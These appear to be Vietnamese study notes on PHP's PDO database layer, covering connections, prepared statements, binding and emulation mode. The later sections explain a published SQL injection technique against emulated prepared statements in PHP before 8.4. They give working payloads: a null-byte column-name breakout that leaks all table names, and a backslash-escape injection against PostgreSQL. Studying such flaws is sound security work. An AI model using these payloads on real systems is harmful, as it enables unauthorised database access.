---
title: PDO

---

---
title: PDO
---
**TÀI LIỆU**
[Base](https://viblo.asia/p/pdo-trong-php-khai-niem-va-nhung-thao-tac-co-ban-57rVRq59R4bP)
[The only proper PDO](https://viblo.asia/p/the-only-proper-pdo-tutorial-Do754EvLKM6)
[Technique](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)



# 1. PDO là gì
- là một lớp truy xuất CSDL cung cấp phương pháp thống nhất để làm việc với nhiều loại CSDL khác nhau

- sử dụng **Prepared Statements**  để ngăn chặn SQLi, nó tự động escape các ký tự đặc biệt và xử lý dữ liệu đầu vào an toàn
- Có nhiều helper function cho các thao tác truy xuất thông thường (VD: `fetch()`, `fetchAll()`)
- PDO cung cấp một API cấp cao, thống nhất hơn 12 loại CSDL khác nhau (MySQL, SQLite,....) giúp chuyển đổi db dễ dàng bằng cách thay đổi connection string

# 2. Chức năng cơ bản trong PDO
## Khởi tạo kết nối
- kết nối được thực hiện bằng cách tạo một đối tượng mới từ class `PDO`
- cấu trúc cơ bản
```php!
$pdo = new PDO($dsn, $username, $password, $options);
```
## exec()
- dùng để thực hiện các câu lệnh SQL không trả về dữ liệu (như `INSERT, UPDATE, DELETE`)
    - trả về số lượng dòng bị ảnh hưởng 
```php!
$count = $pdo->exec("DELETE FROM users WHERE id = 1");
echo "đã xóa $count dòng";
```

## PDO::query() đơn giản
- sử dụng **PDO::query()** cho các câu truy vấn không có biến (static query)
- Phương thức này trả về PDOStatement object
```php!
$stmt = $pdo->query('SELECT name FROM users'); 
while ($row = $stmt->fetch()) 
{     
    echo $row['name'] . "\n"; 
}
```

- `$pdo`: connection object được tạo trước đó
- `->query(...)`: gửi câu lệnh SQL trực tiếp đến db để thực thi ngay lập tức
- `$stmt`: kết quả trả về
    - nếu success: trả về một đối tượng `PDOStatement` và đối tượng này chứa tập hợp các kết quả (result set) để ta có thể duyệt qua
    - Nếu fail: trả về `false`
- `while ($row = $stmt->fetch())`: 
    - `$stmt->fetch()` lấy ra 1 row tiếp theo từ result set, mỗi lần vòng lặp chạy thì nó sẽ lấy hàng kế tiếp
    - `$row`: biến chứa dữ liệu của hàng vừa lấy được, mặc định PDO trả về một mảng
    - vòng lặp `while`: sẽ tiếp tục chạy cho đến khi `fetch()` không còn dữ liệu để lấy (trả về `false`) => vòng lặp dừng lại
- `echo $row['name'] . "\n";`: truy xuất giá trị của cột `name` trong hàng hiện tại và in ra kèm với ký tự xuống dòng

- Có phần giống như resource được return bởi hàm `mysql_query()` (cụ thể là trong cách mà ta lấy ra các dòng dữ liệu)

## Prepared statements 
- Prepare: chuẩn bị câu lệnh SQL với placeholder (`?` hoặc `:name`)
- Bind: gắn giá trị thực vào các placeholder
- Execute: thực thi câu lệnh 

### unnamed placeholder
- Sử dụng dấu `?` làm placeholder, giá trị truyền vào theo thứ tự:
``` php!
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ? AND status = ?'); 
// dấu `?` thứ 1 dành cho `email`
// dấu `?` thứ 2 dành cho `status`
$stmt->execute([$email, $status]); 
// gửi các giá trị $email, $status vào các chỗ trống `?` đã tạo ở bước trên và yêu cầu db chạy lệnh
$user = $stmt->fetch();
// nếu tìm thấy thì `$user` sẽ là một mảng chứa thông tin (email, status,...)
// nếu không tìm thấy thì sẽ là false
```

### named placeholder
- sử dụng `:name` làm placeholder, giá trị được truyền qua associative array

```php!
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND status = :status'); 
$stmt->execute(['email' => $email, 'status' => $status]); 
$user = $stmt->fetch();
```

### `prepare()` và `execute()`
- dùng để xử lý các truy vấn có chứa tham số đầu vào
    - `prepare($sql)`: gửi cấu trúc câu lệnh SQL mẫu đến DB để biên dịch trước
    - `execute($params)`: gửi giá trị thực tế để gắn vào các placeholder

```php!
// sử dụng named placeholder (:name)
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => 'user@gmail.com']);
$user = $stmt->fetch();
```

### `fetch()` và `fetchAll()`
- `fetch()`: lấy từng dòng dữ liệu một (thường dùng trong vòng lặp `while`)

- `fetchAll()`: lấy toàn bộ dữ liệu trả về và đưa vào một mảng

# 3. The Only Proper PDO (PDO đúng cách)
## Kết nối DSN (Data Source Name) và Charset
- một kết nối chuẩn phải định nghĩa mọi thứ trong `DSN` (nhất là `charset`)
    - nếu kết nối xong mới chạy query `SET NAMES 'utf8'` => khiến cho client (PHP) và server (MySQL) có thể không đồng bộ về bộ mã hóa => dẫn đến SQLi qua các ký tự multi-byte
    - Khai báo `charset=utf8mb4` ngay trong chuỗi DSN

`$dsn = "mysql:host=127.0.0.1;dbname=testdb;charset=utf8mb4";`

## Errior mode
- Ở các bản PHP cũ thì PDO sẽ là `PDO::ERRMODE_SILENT` im lặng khi có lỗi SQL
    - luôn luôn thiết lập `PDO::ATTR_ERRMODE` thành `PDO::ERRMODE_EXCEPTION`
    - mọi lỗi SQL sẽ ném ra một `PDOException` giúp code dừng lại ngay, thay vì chạy tiếp với dữ liệu sai, và cho phép dùng `try-catch` để xử lý.

## Prepared Statements là bắt buộc
- không bao giờ nối chuỗi để tạo câu truy vấn nếu có dữ liệu từ người dùng
    + `$pdo->query("SELECT * FROM users WHERE id = " . $_GET['id'])` -> SQLi chết dân
    + Phải sử dụng Placeholders (`?` hoặc `:id`).
        - gửi cấu trúc SQL tách biệt với dữ liệu
        - Bind/execute: dữ liệu được gửi sau và được DB xử lý như văn bản thuần túy, không bao giờ được thực thi như mã lệnh

## Binding
- PDO cung cấp hai phương thức binding: `bindValue()` và `bindParam()` 
- khác biệt chính là `bindParam()` truyền tham chiếu, còn `bindValue()` truyền giá trị

### bindValue()
- lấy giá trị của biến ngay tại dòng code đó và gán vào câu lệnh SQL
- nếu sau đó thay đổi giá trị của biến thì câu lệnh SQL không bị ảnh hưởng

```php!
$stmt = $pdo->prepare("INSERT INTO users (name) VALUES (:name)");

$ten = "tam";

// gán giá trị "tam" vào :name ngay lập tức
$stmt->bindValue(':name', $ten);

$ten = "an"; // Thay đổi biến $ten thành "an"

$stmt->execute(); 
// kết quả db sẽ lưu tên là "tam".
// vì lúc bindValue, biến $ten đang là "tam"
```

### bindParam()
- PHP không lấy giá trị ngay, nó chỉ tạo 1 đường liên kết (tham chiếu) đến biến đó
- Giá trị thực sự chỉ được lấy khi hàm `execute()` được gọi

```php!
$stmt = $pdo->prepare("INSERT INTO users (name) VALUES (:name)");

$ten = "tam";

// tạo liên kết giữa :name và biến $ten (chưa lấy giá trị ngay)
$stmt->bindParam(':name', $ten);

$ten = "an"; // Thay đổi biến $ten thành "an"

$stmt->execute(); 
// => db sẽ lưu tên là "an".
// vì khi execute() chạy, nó mới nhìn vào biến $ten xem đang chứa gì
```

- Dùng khi gọi stored procedures có tham số `INOUT` hoặc khí muốn thay đổi giá trị biến trong vòng lặp mà không cần bind lại

# Emulation Mode - PDO::ATTR_EMULATE_PREPARES
- PDO có hai cách thực thi query:
    - `Native prepared statements`: quere và data được gửi riêng biệt đến db server
    - `Emulated prepared statements` (mặc định): PDO tự escape và format query trước khi gửi đến db
- Ưu điểm khi bật emulated:
    - Có thể sử dụng named placeholder lặp lại
    - Chạy được nhiều query trong một statement
    - Hỗ trợ một số query mà native không hỗ trợ (như `SHOW TABLES`)

# 4. Technique SQL Injection trong PDO prepared Statments
## Cơ chế Emulated Prepared Statements
- PDO có một tùy chọn là `PDO::ATTR_EMULATE_PREPARES = true/false`
    - Khi để `true` (mặc định) ở một số driver MySQL: PHP không gửi câu lệnh prepare sang MySQL ngay, mà PHP tự mình parser: nó tìm các dấu `?` hoặc `:name`, sau đó escape dữ liệu đầu vào và thay thế trực tiếp vào chuỗi SQL, Cuối cùng nó gửi một câu query thuần (đã nối chuỗi) sang MySQL

- Khi bộ parser của PHP và bộ parser của MySQL hiểu câu lệnh khác nhau, nếu kẻ tấn công tìm ra một chuỗi ký tự mà PHP nghĩ là an toàn (hoặc không phải là cú pháp đặc biệt) nhưng MySQL lại xử lý khác đi => bị khai thác

## null byte injection
- ký tự null (`\0` hoặc `%00`)
- attcker chèn một ký tự null vào trong tên col hoặc table (VD: `?%00`)
- Khi parser của PHP (< v8.4) đọc đến dấu backtick mở đầu tên cột, nó nghĩ là một tên cột hợp lệ
- Khi gặp ký tự null thì parser bị lỗi regex và thực hiện backtracking
- thay vì báo lỗi thì nó lại coi dấu backtick đó là một ký tự bình thường, và coi dấu `?` (một phần của tên cột độc hại do ta nhập) là một placeholder hợp lệ

=> PHP thay dấu `?` đó bằng payload mà ta cung cấp ở tham số tiếp theo
=> kết quả là payload của ta thoát ra khỏi cặp dấu backtick và trở thành mã SQL exploit được gửi đến MySQL

- Xét đoạn code sau
```php!
$col = '`' . str_replace('`', '``', $_GET['col']) . '`'; 
$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?"); 
$stmt->execute([$_GET['name']]);
```

- Tham số `col` được escape đúng cách nên không thể inject được
- Nhưng nếu ta truyền null byte (`\x00`) thì PDO parser sẽ bị nhầm lẫn:
```javascript!
http://localhost/?col=%00&name=x  

query sinh ra: SELECT `\0` FROM fruit WHERE name = ?
```

- Parser sẽ gặp null byte, backtrack và coi dấu backtick là special character (bỏ qua)
- nếu thêm dấu `?` sau null byte:
```htmlembbed!
http://localhost/?col=?%00&name=x 

Lỗi: number of bound variables does not match number of tokens
```

- PDO đã nhận diện `?` trong `col` làm một bound parameter
- ta có thể thêm comment để PDO dừng parsing:
```javascript!
http://localhost/?col=?%23%00&name=x 
query sau khi prepare: SELECT `'x'#\0` FROM fruit WHERE name = ?

```

## payload attack
Để exploit hoàn toàn ta cần bypass một số hạn chế:
1.	Escape khỏi table name bằng backtick và comment
2.	Kết thúc statement bằng dấu chấm phẩy (vì null byte không thể ở trong comment)
3.	Tạo subquery với column name khớp với phần injection

```python!
col=\?%23%00 name=x` FROM (SELECT table_name AS `'x` FROM information_schema.tables)y;%23  

query thực thi: SELECT `\'x` FROM (SELECT table_name AS `\'x` FROM information_schema.tables)y;#  

Kết quả: leak toàn bộ tên bảng trong database
```

# 5. Attack với Backslash Escape (PHP < v8.4)

- ở PHP các < v8.4, PDO sử dụng một parser chung cho tất cả db. Parser này giả định rằng là mọi string đều được escape bằng backslash (kể cả PostgreSQL không hỗ trợ backslash escape)

- Xét đoạn code PostgreSQL sau:
```php!
$pdo = new PDO($dsn, $user, '', [PDO::ATTR_EMULATE_PREPARES => true]); 
$sku = $pdo->quote($_GET['sku']); 
$stmt = $pdo->prepare("SELECT * FROM fruit WHERE sku = $sku AND name = ?"); 
$stmt->execute([$_GET['name']]);
```

- Đoạn code này có vẻ an toàn, một tham số được bind, tham số kia được escape bằng `quote()`, nhưng:

```php!
sku=\'?--&name=UNION SELECT 1337,chr(33),1337,chr(33)--  

query sau khi prepare: SELECT * FROM fruit WHERE sku = '\\'?--' AND name = ?  

PDO parser thấy: string '\\\'' sau đó là ? ngoài string 

PostgreSQL thấy: string '\\', sau đó là ?--' (comment) AND...  

Kết quả: SQLi thành công
Output: 1337 : ! : 1337 : !
```



























